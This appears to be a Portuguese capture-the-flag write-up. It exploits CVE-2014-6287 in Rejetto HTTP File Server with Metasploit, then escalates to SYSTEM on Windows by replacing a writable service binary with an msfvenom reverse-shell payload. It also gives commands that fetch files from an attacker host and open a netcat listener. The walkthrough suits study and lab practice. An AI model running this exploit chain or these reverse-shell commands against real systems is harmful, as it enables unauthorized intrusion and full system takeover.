Encontramos uma vulnerabilidade conhecida no Rejetto HTTP File Server. Para explora-la usamos o metasploit:
1. ``msfconsole``
2. ``search cve:2014-6287``
3. ``use 0``
4. setamos o RHOSTS, o RPORT e o LHOST
5. ``exploit``
6. ``search -f user.txt``
7. ``cat user.txt``


## Escalação de privilégio em ambiente windows

upload desse script na máquina alvo: [raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

partimos para uma powershell a partir do meterpreter usando:
1. ``load powershell``
2. ``powershell_shell``

Executamos o script enumerador:
1. ``PS > .\PowerUp.ps1``
2. ``PS > Invoke-AllChecks``

Encontramos isso dentre as coisas enumeradas:
```
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files
```

A opção **CanRestart** estando como **true** permite que reiniciemos um serviço no sistema. Além disso, o diretório da aplicação também tem permissão de escrita. Isso significa que podemos substituir a aplicação legítima pela nossa versão maliciosa, reiniciar o serviço e, assim, executar nosso programa infectado

Usando o msfvenom podemos gerar um payload de reverse shell para windows
``msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe``

navegamos ate a pasta que contém o ASCService.exe. Ao tentar dar upload na nossa versão o meterpreter diz que o arquivo está sendo usado por outro processo.

Para parar o serviço podemos usar ``sc stop ASCService.exe`` dentro do powershell. Depois voltamos para o meterpreter com ``Ctrl + Z`` e fazemos upload do arquivo.

primeiro temos que parar o serviço que está rodando para conseguirmos substituir o arquivo, para isso usamos:
``net stop AdvancedSystemCareService9``

substituímosmos o arquivo
``copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"``

não podemos esquecer de colocar um listenner para nossa reverse_shell
``nc -nlvp 4443``

depois é só reiniciar o serviço com:
``net start AdvancedSystemCareService9``

Pelo acesso de root basta navegar ate o desktop do usuário administrador. Lembrando que para listar pastas no cmd usamos ``dir`` e o equivalente ao ``cat`` é ``type``


## Fazendo sem o metasploit
A fase de entrar no sistema é bem simples. Mantenha um netcat listener na porta que você colocou no arquivo do exploit.
para fazer o upload do arquivo usamos ``powershell -c "Invoke-WebRequest -OutFile <nome do arquivo na saida> http://<attacker ip>/<arquivo para subir>"``




